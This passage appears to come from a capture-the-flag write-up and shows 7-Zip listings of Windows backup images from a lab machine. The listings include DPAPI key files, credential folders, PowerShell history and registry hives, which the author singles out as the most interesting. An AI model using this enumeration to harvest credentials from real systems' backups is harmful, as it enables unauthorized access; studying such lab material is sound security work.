2025-02-16 10:52:22 ....A        11240         1017  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_125_3_PNGEncoded_Header.bin
2025-02-16 10:52:22 ....A       460800        28378  Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_125_3_PNGEncoded_Data.bin
2025-02-16 10:49:11 ....A        17491         2558  Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910.log
2025-02-16 10:49:11 ....A       126956        15318  Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910_000_vcRuntimeMinimum_x64.log
2025-02-16 10:49:11 ....A       133546        16033  Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910_001_vcRuntimeAdditional_x64.log
2025-02-16 10:49:10 ....A        16652         2476  Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909.log
2025-02-16 10:49:10 ....A       127134        15292  Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909_000_vcRuntimeMinimum_x86.log
2025-02-16 10:49:10 ....A       139418        16620  Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909_001_vcRuntimeAdditional_x86.log
2025-02-16 11:22:32 ....A         3702         1176  Administrator/AppData/Local/Temp/Dis1FA5.tmp
2025-02-16 10:48:49 ....A         2551          998  Administrator/AppData/Local/Temp/msedge_installer.log
2025-02-16 10:52:00 ....A       231246        27309  Administrator/AppData/Local/Temp/vminst.log
2025-02-16 11:22:33 ....A         1738          833  Administrator/AppData/Local/Temp/WM0.xml
2025-02-16 11:22:33 ....A         1632          835  Administrator/AppData/Local/Temp/WM1.xml
2025-02-16 11:22:33 ....A         3170          865  Administrator/AppData/Local/Temp/WM2.xml
2025-02-16 10:52:00 ....A      3257808       237050  Administrator/AppData/Local/Temp/vmmsi.log_20250216_025200.log
2025-02-16 11:22:36 ....A         2940          902  Administrator/AppData/Local/Temp/WM4.xml
2025-02-16 11:22:36 ....A         1492          809  Administrator/AppData/Local/Temp/WM5.xml
2025-02-16 11:22:36 ....A         3130          829  Administrator/AppData/Local/Temp/WM6.xml
2025-02-16 11:22:36 ....A         4782         1271  Administrator/AppData/Local/Temp/WM7.xml
2025-02-16 11:22:36 ....A         1484          813  Administrator/AppData/Local/Temp/WM8.xml
2025-02-16 10:48:48 ....A          693          458  Administrator/AppData/Local/Temp/wmsetup.log
2025-02-16 10:52:05 ...SA          313          313  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D
2025-02-16 10:49:06 ...SA          471          471  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/698460A0B6E60F2F602361424D832905_8BB23D43DE574E82F2BEE0DF0EC47EEB
2025-02-16 10:49:13 ...SA        71954        71954  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/77EC63BDA74BD0D0E0426DC8F8008506
2025-02-16 10:48:49 ...SA         1858         1858  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7EF516642261549A23D49DB36FFE5F3F_06DC937B2B8DD7A8D6D85B5D745374B6
2025-02-16 10:49:06 ...SA          727          727  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/8EC9B1D0ABBD7F98B401D425828828CE_264D47D6D8C34D077DC5D354913A7951
2025-02-16 10:49:06 ...SA          727          727  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/C8E534EE129F27D55460CE17FD628216_1130D9B25898B0DB0D4F04DC5B93F141
2025-02-16 10:48:49 ...SA          471          471  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_0FB9553B978E7F00C6B2309507DEB64A
2025-02-16 10:48:49 ...SA          471          471  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_363582827213C09529A76F35FB615187
2025-02-16 10:49:13 ...SA         1428         1428  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/F2E248BEDDBB2D85122423C41028BFD4
2025-02-16 10:50:07 ...SA         7796         7796  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/FB0D848F74F70BB2EAA93746D24D9749
2025-02-16 10:53:11 ...SA          400          400  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D
2025-02-16 10:49:06 ...SA          302          302  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/57C8EDB95DF3F0AD4EE2DC2B8CFD4157
2025-02-16 10:50:06 ...SA          400          400  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/698460A0B6E60F2F602361424D832905_8BB23D43DE574E82F2BEE0DF0EC47EEB
2025-02-16 10:52:05 ...SA          328          328  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/77EC63BDA74BD0D0E0426DC8F8008506
2025-02-16 10:50:06 ...SA          564          544  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7EF516642261549A23D49DB36FFE5F3F_06DC937B2B8DD7A8D6D85B5D745374B6
2025-02-16 10:50:06 ...SA          404          404  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/8EC9B1D0ABBD7F98B401D425828828CE_264D47D6D8C34D077DC5D354913A7951
2025-02-16 10:50:06 ...SA          412          412  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/C8E534EE129F27D55460CE17FD628216_1130D9B25898B0DB0D4F04DC5B93F141
2025-02-16 10:50:06 ...SA          412          412  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_0FB9553B978E7F00C6B2309507DEB64A
2025-02-16 10:50:06 ...SA          412          412  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_363582827213C09529A76F35FB615187
2025-02-16 10:49:13 ...SA          254          254  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/F2E248BEDDBB2D85122423C41028BFD4
2025-02-16 10:52:05 ...SA          330          330  Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/FB0D848F74F70BB2EAA93746D24D9749
2025-02-16 10:48:47 ...SA          960          960  Administrator/AppData/Roaming/Microsoft/Crypto/Keys/de7cf8a7901d2ad13e5c67c29e5d1662_4306fbaf-6469-426f-9f9e-c1c30342a3f9
2021-05-08 08:15:33 ....A         1259          512  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk
2021-05-08 08:15:33 ....A         1259          512  Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk
2021-05-08 08:15:33 ....A         1259          512  simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk
2021-05-08 08:18:35 ..HSA          270          270  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini
2021-05-08 08:18:35 ..HSA          270          270  Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini
2021-05-08 08:18:35 ..HSA          270          270  simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini
2025-02-16 10:48:49 ....A         2332          964  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Microsoft Edge.lnk
2021-05-08 08:15:33 ....A         1158          444  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk
2021-05-08 08:15:33 ....A         1158          444  Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk
2021-05-08 08:15:33 ....A         1158          444  simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk
2021-05-08 08:14:58 ....A          352          352  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk
2021-05-08 08:14:58 ....A          352          352  Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk
2021-05-08 08:14:58 ....A          352          352  simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk
2021-05-08 08:14:58 ....A          334          334  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk
2021-05-08 08:14:58 ....A          334          334  Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk
2021-05-08 08:14:58 ....A          334          334  simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk
2025-02-16 10:48:53 ..HS.           83           83  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/desktop.ini
2021-05-08 08:14:58 ....A          407          407  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/File Explorer.lnk
2021-05-08 08:14:58 ....A          407          407  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk
2021-05-08 08:14:58 ....A          407          407  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk
2021-05-08 08:14:58 ....A          407          407  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk
2025-02-16 10:48:11 ....A         2398          998  Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/Microsoft Edge.lnk
2025-02-16 10:48:47 ..HSA           24           24  Administrator/AppData/Roaming/Microsoft/Protect/CREDHIST
2025-02-16 10:48:47 ..HSA          468          468  Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500/7db75135-c076-465e-a4cc-3d5243f57db7
2025-02-16 10:48:47 ..HSA           24           24  Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500/Preferred
2025-02-16 10:48:49 ..HS.          196          196  Administrator/AppData/Roaming/Microsoft/Windows/AccountPictures/desktop.ini
2025-02-16 10:48:49 ..HS.          302          302  Administrator/AppData/Roaming/Microsoft/Windows/Libraries/desktop.ini
2025-02-16 10:48:48 ....A         2125         1348  Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Documents.library-ms
2025-02-16 10:48:49 ....A         2082         1312  Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Music.library-ms
2025-02-16 10:48:48 ....A         2100         1309  Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Pictures.library-ms
2025-02-16 10:48:48 ....A         2110         1336  Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Videos.library-ms
2025-02-16 11:10:58 ....A          104          104  Administrator/AppData/Roaming/Microsoft/Windows/Recent/All Tasks.lnk
2025-02-16 11:18:05 ....A         1702          948  Administrator/AppData/Roaming/Microsoft/Windows/Recent/ConsoleHost_history.txt.lnk
2025-02-16 10:48:48 ..HS.          432          432  Administrator/AppData/Roaming/Microsoft/Windows/Recent/desktop.ini
2025-02-16 11:18:05 ....A         1350          854  Administrator/AppData/Roaming/Microsoft/Windows/Recent/PSReadLine.lnk
2025-02-16 11:22:36 ....A      5183218       536073  Administrator/AppData/Local/Temp/WM3.xml
2025-02-16 11:10:45 ....A          116          116  Administrator/AppData/Roaming/Microsoft/Windows/Recent/System and Security.lnk
2025-02-16 11:10:45 ....A          146          146  Administrator/AppData/Roaming/Microsoft/Windows/Recent/System.lnk
2025-02-16 11:10:58 ....A          476          476  Administrator/AppData/Roaming/Microsoft/Windows/Recent/View network status and tasks.lnk
2025-02-16 11:18:05 ....A         4096         1222  Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/5f7b5f1e01b83767.automaticDestinations-ms
2025-02-16 11:10:58 ....A         4096         1053  Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/7e4dca80246863e3.automaticDestinations-ms
2025-02-16 11:18:05 ....A         4096         1238  Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/9b9cdc69c1c24e2b.automaticDestinations-ms
2025-02-16 10:48:50 ....A           24           24  Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/7e4dca80246863e3.customDestinations-ms
2025-02-16 11:18:05 ....A         7168         1913  Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms
2025-02-16 10:48:53 ....A           24           24  Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/f01b4d95cf55d32a.customDestinations-ms
2025-02-16 11:10:46 ....A           24           24  Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/f18460fded109990.customDestinations-ms
2025-02-16 10:48:53 ....A         1045          729  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Bluetooth File Transfer.LNK
2021-05-08 08:18:31 ....A            3            3  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget
2021-05-08 08:18:31 ....A            3            3  Default/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget
2021-05-08 08:18:31 ....A            3            3  simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget
2021-05-08 08:18:31 ....A            7            7  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink
2021-05-08 08:18:31 ....A            7            7  Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink
2021-05-08 08:18:31 ....A            7            7  simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink
2025-02-16 10:48:53 ..HS.          576          507  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini
2021-05-08 08:18:31 ....A            4            4  Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail
2021-05-08 08:18:31 ....A            4            4  Default/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail
2021-05-08 08:18:31 ....A            4            4  simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail
2025-02-16 11:18:27 ....A          355          355  Administrator/AppData/Roaming/Microsoft/Windows/ServerManager/ServerList.xml
2025-02-16 10:48:48 ..HS.          174          174  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini
2025-02-16 10:48:48 ..HS.          174          174  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini
2022-03-03 03:57:47 ..HSA          568          406  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini
2021-05-08 08:14:19 ....A         1106          415  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk
2021-05-08 08:14:19 ....A         1106          415  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk
2021-05-08 08:14:19 ....A         1106          415  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk
2021-05-08 08:14:19 ....A         1108          419  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk
2021-05-08 08:14:19 ....A         1108          419  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk
2021-05-08 08:14:19 ....A         1108          419  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk
2021-05-08 08:14:19 ....A         1106          421  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk
2021-05-08 08:14:19 ....A         1106          421  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk
2021-05-08 08:14:19 ....A         1106          421  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk
2025-02-16 10:48:48 ..HS.          334          334  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini
2025-02-16 10:48:48 ....A         1336          913  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Internet Explorer.lnk
2025-02-16 10:48:49 ..HS.          174          174  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Administrative Tools/desktop.ini
2021-05-08 08:18:31 ..HSA          170          170  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini
2021-05-08 08:18:31 ..HSA          170          170  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini
2021-05-08 08:18:31 ..HSA          170          170  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini
2025-02-16 10:48:49 ..HS.          174          174  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/desktop.ini
2021-05-08 08:14:58 ....A         1281          505  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk
2021-05-08 08:14:58 ....A         1281          505  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk
2021-05-08 08:14:58 ....A         1281          505  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Administrative Tools.lnk
2021-05-08 08:14:16 ....A         1142          431  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk
2021-05-08 08:14:16 ....A         1142          431  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk
2021-05-08 08:14:16 ....A         1142          431  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Command Prompt.lnk
2021-05-08 08:14:58 ....A          335          335  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk
2021-05-08 08:14:58 ....A          335          335  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk
2021-05-08 08:14:58 ....A          335          335  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/computer.lnk
2021-05-08 08:14:58 ....A          405          405  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk
2021-05-08 08:14:58 ....A          405          405  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk
2021-05-08 08:14:58 ....A          405          405  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Control Panel.lnk
2021-05-08 08:18:35 ..HSA          934          463  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini
2021-05-08 08:18:35 ..HSA          934          463  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini
2021-05-08 08:18:35 ..HSA          934          463  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Desktop.ini
2021-05-08 08:14:58 ....A          409          409  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk
2021-05-08 08:14:58 ....A          409          409  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk
2021-05-08 08:14:58 ....A          409          409  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/Run.lnk
2021-05-08 08:18:31 ....A         2539         1068  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk
2021-05-08 08:18:31 ....A         2539         1068  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk
2021-05-08 08:18:31 ....A         2539         1068  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell (x86).lnk
2022-03-03 03:57:45 ....A         2539         1040  Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk
2022-03-03 03:57:45 ....A         2539         1040  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk
2022-03-03 03:57:45 ....A         2539         1040  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Windows PowerShell/Windows PowerShell.lnk
2025-02-16 11:10:31 ....A       197085       197085  Administrator/AppData/Roaming/Microsoft/Windows/Themes/CachedFiles/CachedImage_2558_1238_POS4.jpg
2025-02-16 10:51:41 ....A       226489       214803  Administrator/AppData/Roaming/Microsoft/Windows/Themes/TranscodedWallpaper
2025-02-16 10:48:48 ..HSA          412          390  Administrator/Contacts/desktop.ini
2025-02-16 10:48:48 ..HSA          282          282  Administrator/Desktop/desktop.ini
2025-02-16 10:48:49 ..HSA          402          383  Administrator/Documents/desktop.ini
2025-02-16 10:48:48 ..HSA          282          282  Administrator/Downloads/desktop.ini
2025-02-16 11:10:30 ....A          208          208  Administrator/Favorites/Bing.url
2025-02-16 10:48:48 ..HSA          402          383  Administrator/Favorites/desktop.ini
2025-02-16 10:48:48 ..HSA           80           80  Administrator/Favorites/Links/desktop.ini
2025-02-16 10:48:49 ..HS.          504          430  Administrator/Links/desktop.ini
2025-02-16 10:48:49 ....A          518          518  Administrator/Links/Desktop.lnk
2025-02-16 10:48:49 ....A          975          761  Administrator/Links/Downloads.lnk
2025-02-16 10:48:48 ..HSA          504          398  Administrator/Music/desktop.ini
2025-02-16 10:48:48 ..HSA          504          396  Administrator/Pictures/desktop.ini
2025-02-16 10:48:49 ..HSA          282          282  Administrator/Saved Games/desktop.ini
2025-02-16 10:48:49 ..HS.          524          425  Administrator/Searches/desktop.ini
2025-02-16 10:48:49 .RH.A          248          248  Administrator/Searches/Everywhere.search-ms
2025-02-16 10:48:49 .RH.A          248          248  Administrator/Searches/Indexed Locations.search-ms
2025-02-16 10:48:48 ..HSA          504          396  Administrator/Videos/desktop.ini
2021-05-08 08:06:51 ..HSA        20480         5560  Default/NTUSER.DAT.LOG2
2025-02-16 11:06:55 ....A       262144        38188  Default/NTUSER.DAT
2025-02-16 19:48:13 ..HSA        65536         1362  Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 19:48:13 ..HSA       524288         4309  Default/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:03:32 ....A        64223        20518  Default/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml
2025-02-16 11:03:32 ....A        64223        20518  simon.watson/AppData/Local/Microsoft/Windows/Shell/DefaultLayouts.xml
2021-05-08 08:18:31 ..HSA          440          440  Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini
2021-05-08 08:18:31 ..HSA          440          440  simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini
2025-02-16 11:03:34 ..HSA          568          406  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini
2025-02-16 11:03:34 ..HSA          568          406  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini
2021-05-08 08:18:31 ..HSA          170          170  Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini
2021-05-08 08:18:31 ..HSA          170          170  simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini
2021-05-08 08:18:31 ..HSA          174          174  Public/desktop.ini
2025-02-16 10:48:48 ..HS.          196          196  Public/AccountPictures/desktop.ini
2021-05-08 08:18:31 ..HSA          174          174  Public/Desktop/desktop.ini
2021-05-08 08:18:31 ..HSA          278          278  Public/Documents/desktop.ini
2021-05-08 08:18:31 ..HSA          174          174  Public/Downloads/desktop.ini
2021-05-08 08:18:31 ..HSA          175          175  Public/Libraries/desktop.ini
2021-05-08 08:18:31 ....A          999          672  Public/Libraries/RecordedTV.library-ms
2021-05-08 08:18:31 ..HSA          380          380  Public/Music/desktop.ini
2021-05-08 08:18:31 ..HSA          380          380  Public/Pictures/desktop.ini
2021-05-08 08:18:31 ..HSA          380          380  Public/Videos/desktop.ini
2025-02-16 11:15:52 ..HSA        53248        14393  simon.watson/ntuser.dat.LOG1
2025-02-16 11:15:54 ..HSA        65536         1376  simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
2025-02-16 11:18:25 ..H.A       262144        62035  simon.watson/NTUSER.DAT
2025-02-16 11:15:52 ..HSA       524288         4309  simon.watson/NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:18:25 ..H.A         8192         1358  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat
2025-02-16 11:15:52 ..HSA         8192         1379  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG1
2025-02-16 11:15:52 ..HSA        16384         1078  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat.LOG2
2025-02-16 11:15:54 ..HSA        65536         1448  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TM.blf
2025-02-16 11:15:52 ..HSA       524288         4309  simon.watson/AppData/Local/Microsoft/Windows/UsrClass.dat{29917715-ec57-11ef-9385-000c2945598d}.TMContainer00000000000000000001.regtrans-ms
2025-02-16 11:18:02 ....A        23652        13197  simon.watson/AppData/Local/Microsoft/Windows/PowerShell/StartupProfileData-Interactive
2025-02-16 11:18:14 ....A         1467          554  simon.watson/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
------------------- ----- ------------ ------------  ------------------------
2025-02-16 19:48:13           88021489      9839628  618 files, 886 folders

Warnings: 1

```

`AWSJPWK0222-02.wim` has a bunch as well, but most interestingly, the registry hives!

```

oxdf@hacky$ 7z l AWSJPWK0222-02.wim

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 50660968 bytes (49 MiB)

Listing archive: AWSJPWK0222-02.wim
--
Path = AWSJPWK0222-02.wim
Type = wim
WARNING = Some files have incorrect reference count
Physical Size = 50660968
Size = 227216933
Packed Size = 50650331
Method = XPress:15
Cluster Size = 32768
Created = 2025-02-16 11:23:45.6986518
Modified = 2025-02-16 11:23:45.6986518
Comment = <WIM><TOTALBYTES>50660130</TOTALBYTES><IMAGE INDEX="1"><DIRCOUNT>43</DIRCOUNT><FILECOUNT>86</FILECOUNT><TOTALBYTES>229314097</TOTALBYTES><HARDLINKBYTES>0</HARDLINKBYTES><CREATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3DF39196</LOWPART></CREATIONTIME><LASTMODIFICATIONTIME><HIGHPART>0x01DB8065</HIGHPART><LOWPART>0x3DF39196</LOWPART></LASTMODIFICATIONTIME><WIMBOOT>0</WIMBOOT><NAME>Backup02</NAME></IMAGE></WIM>
Version = 1.13
Multivolume = -
Volume = 1
Volumes = 1
Images = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-05-08 08:20:24 D....                            Journal
2025-02-16 19:47:38 D....                            RegBack
2021-05-08 08:20:24 D....                            systemprofile
2025-02-16 11:06:03 D....                            TxR
2021-05-08 08:20:24 D..S.                            systemprofile/AppData
2025-02-16 10:48:42 D....                            systemprofile/AppData/Local
2025-02-16 10:48:12 D....                            systemprofile/AppData/LocalLow
2025-02-16 19:47:44 D....                            systemprofile/AppData/Roaming
2025-02-16 11:10:47 D....                            systemprofile/AppData/Local/D3DSCache
2025-02-16 10:48:44 D....                            systemprofile/AppData/Local/Microsoft
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Packages
2025-02-16 11:06:47 D....                            systemprofile/AppData/Local/D3DSCache/5adbeda69f8554f3
2025-02-16 11:10:45 D....                            systemprofile/AppData/Local/D3DSCache/90ccb9cba3f45768
2025-02-16 10:52:27 D....                            systemprofile/AppData/Local/D3DSCache/c3d1e85f571946f8
2025-02-16 11:10:47 D....                            systemprofile/AppData/Local/D3DSCache/f9156d1136660b11
2025-02-16 10:48:34 D..S.                            systemprofile/AppData/Local/Microsoft/Credentials
2025-02-16 10:48:44 D....                            systemprofile/AppData/Local/Microsoft/Vault
2025-02-16 10:49:09 D....                            systemprofile/AppData/Local/Microsoft/Windows
2025-02-16 10:48:44 D....                            systemprofile/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28
2025-02-16 10:49:09 D....                            systemprofile/AppData/Local/Microsoft/Windows/0
2025-02-16 10:49:09 D....                            systemprofile/AppData/Local/Microsoft/Windows/1033
2025-02-16 10:49:10 D....                            systemprofile/AppData/Local/Microsoft/Windows/Caches
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Microsoft/Windows/CloudAPCache
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Microsoft/Windows/CloudAPCache/MicrosoftAccount
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost
2025-02-16 19:47:38 D....                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC
2025-02-16 19:47:38 D.HS.                            systemprofile/AppData/Local/Packages/microsoft.windows.fontdrvhost/AC/INetCache
